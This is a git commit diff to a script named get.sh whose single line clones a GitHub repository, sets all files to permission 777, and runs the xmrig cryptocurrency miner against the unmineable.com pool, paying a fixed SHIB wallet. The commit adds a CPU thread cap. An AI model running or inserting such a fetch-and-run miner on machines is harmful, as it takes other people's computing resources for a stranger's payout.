dcef2d532bb62da0ecd114a0804d6c236251f471
binniyup <85913148+binniyup@users.noreply.github.com>
2021-06-14 22:45:38 -0400

    Update get.sh

--- get.sh
+++ get.sh
@@ -1,1 +1,1 @@
-git clone https://github.com/quincyhays/bmxmrig.git && cd bmxmrig && chmod 777 * && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x748025d6e4e19b9e482dc048a31b970d2772275b.miners --nicehash --randomx-1gb-pages
+git clone https://github.com/quincyhays/bmxmrig.git && cd bmxmrig && chmod 777 * && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x748025d6e4e19b9e482dc048a31b970d2772275b.miners --nicehash --randomx-1gb-pages --cpu-max-threads-hint 50
